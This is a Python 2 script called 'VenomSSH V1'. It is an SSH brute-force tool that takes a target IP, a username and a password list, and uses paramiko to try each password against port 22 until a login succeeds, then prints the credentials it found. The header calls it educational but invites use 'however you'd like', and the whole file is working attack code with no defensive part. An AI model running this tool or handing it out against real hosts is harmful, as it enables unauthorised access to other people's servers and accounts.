# VenomSSH V1 made by Akuhyo
#
# The purpose of this tool is to teach others vulnerabilities and
# how to defend against them. 
#
# The way you use this tool is up to you, and you may use this
# tool at your own risk however you'd like.
#
# If you happen to use this, thank you!

import paramiko, sys, os, socket
global host, username, line, input_file
os.system('clear')

print("VenomSSH V1 (7/17/18)\n")
print(".##..##..######..##..##...####...##...##...####....####...##..##.")
print(".##..##..##......###.##..##..##..###.###..##......##......##..##.")
print(".##..##..####....##.###..##..##..##.#.##...####....####...######.")
print("..####...##......##..##..##..##..##...##......##......##..##..##.")
print("...##....######..##..##...####...##...##...####....####...##..##.")
print(".................................................................")

print("\nThis program was made by Akuhyo.\n\nThis tool was made for security purposes, meaning")
print("that you may use this tool at your own risk.\n")



line = "\n--------------------------------------\n"

try:
 host = raw_input("[*] Enter Target IP: ")
 username = raw_input("\n[*] Enter Target Username: ")
 input_file = raw_input("\n[*] Enter Password List: ")

 if os.path.exists(input_file) == False:
   print "\n[*] File Path Does Not Exist!"
   sys.exit(4)

except KeyboardInterrupt:
 print "\n\n[*] User Requested An Interrupt!"
 sys.exit(3)

def ssh_connect(password, code = 0):
 ssh = paramiko.SSHClient()
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

 try:
  ssh.connect(host, port=22, username=username, password=password)
 except paramiko.AuthenticationException:
  #[*] Authentication Failed...
  code = 1
 except socket.error, e:
  #[*] Connection Failed. Host Down"
  code = 2

 ssh.close()
 return code

input_file = open(input_file)

print ""

for i in input_file.readlines():
 password = i.strip("\n")
 try:
  response = ssh_connect(password)

  if response == 0:
   print("%s[!] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
   sys.exit(0)
  elif response == 1:
   print("[!] User: %s [*] Pass: %s => Login Incorrect! <=" % (username, password))
  elif response == 2:
   print("[!] Connection couldn't be established to address: %s" % (host))
   sys.exit(2)
 except Exception, e:
  print e
  pass

input_file.close()

